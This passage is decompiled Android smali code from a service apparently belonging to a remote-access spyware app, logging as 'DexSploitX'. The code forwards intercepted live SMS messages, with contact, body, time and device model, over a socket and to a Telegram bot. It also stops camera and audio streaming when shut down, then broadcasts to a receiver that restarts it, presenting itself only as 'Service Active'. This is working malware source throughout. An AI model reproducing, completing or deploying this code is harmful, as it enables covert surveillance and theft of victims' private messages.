    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 341
    iget-object v2, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    if-eqz v2, :cond_0

    .line 343
    monitor-enter v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 344
    :try_start_1
    const-string v3, "UTF-8"

    invoke-virtual {v1, v3}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/io/OutputStream;->write([B)V

    .line 345
    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V

    .line 346
    const-string v1, "DexSploitX"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, " - "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 347
    monitor-exit v2

    goto :goto_0

    :catchall_0
    move-exception p1

    monitor-exit v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw p1

    .line 349
    :cond_0
    const-string v0, "DexSploitX"

    const-string v1, "Cannot send live SMS - outputStream is null"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 353
    :goto_0
    invoke-static {}, Lcom/system/DroidX/utils/TelegramUploader;->isConfigured()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 354
    const-string v0, "SENT"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "\ud83d\udce4"

    goto :goto_1

    :cond_1
    const-string v0, "\ud83d\udcf1"

    .line 355
    :goto_1
    const-string v1, "SENT"

    invoke-virtual {p1, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v1, "To"

    goto :goto_2

    :cond_2
    const-string v1, "From"

    .line 356
    :goto_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " Live SMS - "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, "\n"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, ": "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string p2, "\nMessage: "

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string p2, "\nTime: "

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string p2, "\nDevice: "

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    sget-object p2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 361
    invoke-static {p1}, Lcom/system/DroidX/utils/TelegramUploader;->sendMessage(Ljava/lang/String;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :cond_3
    return-void

    :catch_0
    move-exception p1

    .line 364
    const-string p2, "DexSploitX"

    new-instance p3, Ljava/lang/StringBuilder;

    const-string p4, "Error sending live SMS data: "

    invoke-direct {p3, p4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p4

    invoke-virtual {p3, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p3

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-static {p2, p3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 365
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    return-void
.end method

.method synthetic lambda$sendResponse$1$com-system-DroidX-ConnectionService(Ljava/lang/String;)V
    .locals 3

    .line 0
    const-string v0, "RES:"

    .line 575
    :try_start_0
    iget-object v1, p0, Lcom/system/DroidX/ConnectionService;->outputStream:Ljava/io/OutputStream;

    if-nez v1, :cond_0

    .line 577
    const-string p1, "DexSploitX"

    const-string v0, "Cannot send response - outputStream is null"

    invoke-static {p1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 581
    :cond_0
    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 582
    :try_start_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, "\n"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 583
    const-string v0, "UTF-8"

    invoke-virtual {p1, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p1

    invoke-virtual {v1, p1}, Ljava/io/OutputStream;->write([B)V

    .line 584
    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V

    .line 585
    const-string p1, "DexSploitX"

    const-string v0, "Response sent successfully"

    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 586
    monitor-exit v1

    return-void

    :catchall_0
    move-exception p1

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw p1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    move-exception p1

    .line 588
    const-string v0, "DexSploitX"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Error sending response: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_1

    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    goto :goto_0

    :cond_1
    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    :goto_0
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 589
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 4

    .line 55
    const-string v0, "DexSploitX"

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const/4 v1, 0x1

    .line 56
    sput-boolean v1, Lcom/system/DroidX/ConnectionService;->isServiceRunning:Z

    .line 61
    :try_start_0
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->createNotificationChannel()V

    .line 62
    const-string v1, "Service Active"

    invoke-direct {p0, v1}, Lcom/system/DroidX/ConnectionService;->createNotification(Ljava/lang/String;)Landroid/app/Notification;

    move-result-object v1

    const/16 v2, 0x64

    invoke-virtual {p0, v2, v1}, Lcom/system/DroidX/ConnectionService;->startForeground(ILandroid/app/Notification;)V

    .line 63
    const-string v1, "Started as foreground service"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 67
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Could not start as foreground (boot context): "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 71
    :goto_0
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->restoreLiveSMSState()V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    const/4 v0, 0x0

    .line 447
    iput-boolean v0, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    .line 448
    sput-boolean v0, Lcom/system/DroidX/ConnectionService;->isServiceRunning:Z

    .line 449
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->stopCameraStream()V

    .line 450
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->stopLiveSMS()Ljava/lang/String;

    .line 451
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->audioStreamer:Lcom/system/DroidX/utils/AudioStreamer;

    if-eqz v0, :cond_0

    .line 452
    invoke-virtual {v0}, Lcom/system/DroidX/utils/AudioStreamer;->stopStreaming()V

    .line 455
    :cond_0
    :try_start_0
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService;->socket:Ljava/net/Socket;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 457
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 461
    :cond_1
    :goto_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/system/DroidX/RestartReceiver;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 462
    invoke-virtual {p0, v0}, Lcom/system/DroidX/ConnectionService;->sendBroadcast(Landroid/content/Intent;)V

    .line 464
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 76
    iget-boolean p1, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    const/4 p2, 0x1

    if-nez p1, :cond_0

    .line 77
    iput-boolean p2, p0, Lcom/system/DroidX/ConnectionService;->isRunning:Z

    .line 78
    sput-boolean p2, Lcom/system/DroidX/ConnectionService;->isServiceRunning:Z

    .line 81
    invoke-direct {p0}, Lcom/system/DroidX/ConnectionService;->promoteToForeground()V

    .line 83
    new-instance p1, Ljava/lang/Thread;

    new-instance p3, Lcom/system/DroidX/ConnectionService$$ExternalSyntheticLambda2;

    invoke-direct {p3, p0}, Lcom/system/DroidX/ConnectionService$$ExternalSyntheticLambda2;-><init>(Lcom/system/DroidX/ConnectionService;)V

    invoke-direct {p1, p3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object p1, p0, Lcom/system/DroidX/ConnectionService;->connectionThread:Ljava/lang/Thread;

    .line 84
    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    :cond_0
    return p2
.end method
